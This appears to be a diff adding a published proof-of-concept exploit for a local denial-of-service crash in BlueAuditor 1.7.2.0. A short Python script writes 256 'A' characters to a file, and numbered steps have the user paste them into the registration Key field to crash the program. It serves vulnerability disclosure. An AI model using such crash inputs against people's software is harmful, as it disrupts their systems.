@@ -1,0 +1,25 @@
+# Exploit Title: BlueAuditor 1.7.2.0 - 'Key' Denial of Service (PoC)
+# Discovery by: Luis Martinez
+# Discovery Date: 2019-01-04
+# Vendor Homepage: www.nsauditor.com
+# Software Link : http://www.nsauditor.com/downloads/blueauditor_setup.exe
+# Tested Version: 1.7.2.0
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on OS: Windows 10 Pro x64 es
+
+# Steps to Produce the Crash: 
+# 1.- Run python code : python BlueAuditor_1.7.2.0.py
+# 2.- Open BlueAuditor_1.7.2.0.txt and copy content to clipboard
+# 3.- Open BlueAuditor
+# 4.- Register -> Enter Registration Code...
+# 5.- Name: -> l4m5
+# 6.- Paste ClipBoard on "Key:"
+# 7.- OK
+# 8.- Crashed
+
+#!/usr/bin/env python
+ 
+buffer = "\x41" * 256
+f = open ("BlueAuditor_1.7.2.0.txt", "w")
+f.write(buffer)
+f.close()
